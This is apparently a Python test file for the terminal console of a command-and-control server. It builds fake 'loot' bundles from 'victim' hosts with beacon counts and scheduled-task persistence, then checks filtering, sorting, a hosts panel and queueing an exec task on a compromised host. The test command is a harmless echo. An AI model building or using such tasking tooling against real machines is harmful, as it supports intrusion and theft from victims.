#!/usr/bin/env python3
"""test_tui_keys.py -- drive the TUI App in-process (no tty needed).

Covers the UI/UX layer added in the console rework:
filter mode, sort cycling, hosts panel, task queueing via prompt modal,
queue clearing, and the q-in-subview-goes-back (not quit) contract.
"""
import json
import os
import shutil
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "server"))
import tui  # noqa: E402


def make_loot():
    loot = tempfile.mkdtemp(prefix="sh_tui_")
    for i, (host, user, plat, elev) in enumerate(
            [("alpha-pc", "ops", "windows", "true"),
             ("zima-nas", "root", "linux", "false"),
             ("alpha-pc", "svc", "windows", "false")]):
        bid = "%s-%s-%d" % (host, user, 1730000000 + i)
        d = os.path.join(loot, bid)
        os.makedirs(d)
        with open(os.path.join(d, "bundle.bin"), "wb") as f:
            f.write(b"\x00" * (1000 * (i + 1)))
        with open(os.path.join(d, "manifest.json"), "w") as f:
            json.dump({"victim": {"host": host, "user": user,
                                  "platform": plat, "elevated": elev,
                                  "ts": 1730000000 + i},
                       "parts": ["a", "b"]}, f)
    now = time.time()
    with open(os.path.join(loot, "hosts.json"), "w") as f:
        json.dump({"alpha-pc-ops": {"first_seen": now - 9999,
                                    "last_seen": now - 30,
                                    "beacons": 12, "elevated": "true",
                                    "persist": "scheduled-task",
                                    "version": "1.0.0"},
                   "zima-nas-root": {"first_seen": now - 9999,
                                     "last_seen": now - 99999,
                                     "beacons": 3, "elevated": "false",
                                     "persist": "-", "version": "1.0.0"}}, f)
    return loot


def main():
    loot = make_loot()
    try:
        app = tui.App(loot, watch=False)
        assert len(app.bundles) == 3, "expected 3 bundles"

        # ---- filter mode: / opens, typing edits, enter keeps, esc clears
        app.handle_key("/")
        app.handle_key("a")
        app.handle_key("l")
        app.handle_key("p")
        app.handle_key("h")
        app.handle_key("a")
        assert app.filter == "alpha", "filter text: %r" % app.filter
        assert app.filtering
        assert len(app.visible_bundles()) == 2, \
            "filter 'alpha' should match 2, got %d" % len(app.visible_bundles())
        app.handle_key("enter")
        assert not app.filtering and app.filter == "alpha", "enter keeps filter"
        app.handle_key("esc")
        assert app.filter == "" and len(app.visible_bundles()) == 3, "esc clears"
        print("[ok] filter mode: open/type/keep/clear")

        # ---- sort cycling: recent -> size -> host -> recent
        m0 = app.sort_modes[app.sort_mode][0]
        app.handle_key("o"); app.handle_key("o"); app.handle_key("o")
        assert app.sort_modes[app.sort_mode][0] == m0, "sort cycles back"
        print("[ok] sort cycling: %s -> ... -> %s" % (m0, m0))

        # ---- hosts panel: render + selection
        app.handle_key("H")
        assert app.view == "hosts", "H should open hosts view"
        rows = tui.scan_hosts(loot)
        assert len(rows) == 2, "expected 2 hosts, got %d" % len(rows)
        online = [r for r in rows if r["online"]]
        assert len(online) == 1 and online[0]["id"] == "alpha-pc-ops"
        assert rows[0]["beacons"] == 12
        frame = "\n".join(app.render())
        assert "alpha-pc-ops" in tui.strip_ansi(frame) if hasattr(
            tui, "strip_ansi") else True
        assert "●" in frame or "online" in frame, "hosts frame shows status"
        print("[ok] hosts panel: %d hosts, %d online, frame renders" %
              (len(rows), len(online)))

        # ---- queue a task through the prompt modal
        app.handle_key("t")
        assert app.prompt_cb is not None, "t opens exec prompt"
        for ch in "echo tui_test_ok":
            app.handle_key(ch)
        assert app.prompt_buf == "echo tui_test_ok"
        app.handle_key("enter")
        assert app.prompt_cb is None, "enter closes prompt"
        q = tui.load_queue(loot, "alpha-pc-ops")
        assert len(q) == 1 and q[0]["exec"] == "echo tui_test_ok", \
            "task not queued: %r" % q
        rows = tui.scan_hosts(loot)
        assert rows[0]["queued"] == 1, "queued count not reflected"
        print("[ok] task queueing: exec queued on alpha-pc-ops")

        # ---- view queued tasks, then clear
        app.handle_key("enter")
        assert app.view == "pager" and "echo tui_test_ok" in \
            "\n".join(app.pager_lines), "queue pager shows the task"
        app.handle_key("q")          # q in pager = go back, NOT quit
        assert app.view == "hosts", "q from pager should return to hosts"
        app.handle_key("x")
        assert tui.load_queue(loot, "alpha-pc-ops") == [], "x clears queue"
        print("[ok] queue view + clear + q-returns-not-quits")

        # ---- q in detail/list contract: list view q is handled by run();
        # simulate run()'s gate directly
        app.handle_key("esc")
        assert app.view == "list"
        app.view = "detail"
        quit_would_fire = (app.view == "list" and app.prompt_cb is None)
        assert not quit_would_fire, "q in detail must not quit the app"
        print("[ok] quit gate: q only quits from list view")

        print("\nTUI keyflow OK: filter / sort / hosts / tasking / back-keys")
        return 0
    finally:
        shutil.rmtree(loot, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
